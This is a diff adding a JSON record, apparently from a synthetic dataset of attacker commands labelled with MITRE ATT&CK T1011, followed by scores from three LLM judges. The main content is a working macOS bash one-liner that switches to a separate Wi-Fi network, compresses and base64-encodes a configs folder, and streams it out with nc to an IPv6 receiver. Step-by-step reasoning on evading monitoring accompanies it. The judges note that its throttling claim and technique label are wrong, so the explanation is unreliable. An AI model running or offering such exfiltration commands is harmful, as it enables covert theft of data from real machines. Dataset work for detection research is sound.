@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"staging-149\" \"sTag149%\" && tar -C /Users/Shared/exports -czf - configs | openssl base64 -A | while read -r l; do printf \"%s\\n\" \"$l\" | nc -6 fe80::cafe:5eed:ba11:5eed%en0 53219 -w 1; sleep 0.3; done",
+  "explanation": "Streams base64-encoded config data line-by-line over a separate Wi\u2011Fi SSID to an IPv6 link-local receiver on a high port, reducing burst signatures and using an alternate network medium per T1011.",
+  "rationale_steps": [
+    "Ensure no active connection to monitored Wi\u2011Fi.",
+    "Join a staging SSID separate from the primary channel.",
+    "Compress and base64-encode the configs.",
+    "Throttle and send line-by-line over IPv6 link-local tied to en0 on a high port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-0b4a25ae-80a90c22",
+  "source_prompt_hash": "0b4a25ae",
+  "timestamp_utc": "2025-09-30T08:33:07.947625Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper command separators (&&, |), balanced quotes, valid flags, and appropriate piping between commands.",
+        "semantic_score": 4,
+        "semantic_justification": "The command aligns with T1011 by exfiltrating data over an alternate network medium (switching to a specific Wi-Fi network), but doesn't directly modify system images as described in the technique, though it does establish a covert channel for potential firmware manipulation.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T17:04:34.665512Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct syntax, balanced quoting, valid flags for each utility, and proper command separators.",
+        "semantic_score": 1,
+        "semantic_justification": "The command is fundamentally misaligned with MITRE ATT&CK T1011 (Modify System Image) as it performs data exfiltration, and its claim of 'line-by-line' streaming and 'reducing burst signatures' is contradicted by the use of `openssl base64 -A` which outputs a single long line.",
+        "combined_score": 3.0,
+        "confidence": 1.0,
+        "timestamp": "2025-10-02T17:04:57.814989Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed with balanced quoting, correct separators, and valid flags for airport, networksetup, tar, openssl, and nc.",
+        "semantic_score": 3,
+        "semantic_justification": "The flow and tools fit exfiltration via alternate Wi\u2011Fi/IPv6, but openssl -A collapses output to a single line (undermining line-by-line throttling), networksetup likely requires sudo so the chain may not proceed, and the action does not align with the provided 'Modify System Image' technique description.",
+        "combined_score": 4.0,
+        "confidence": 0.7,
+        "timestamp": "2025-10-02T17:05:22.209482Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.667,
+    "llm_average_score": 3.833,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
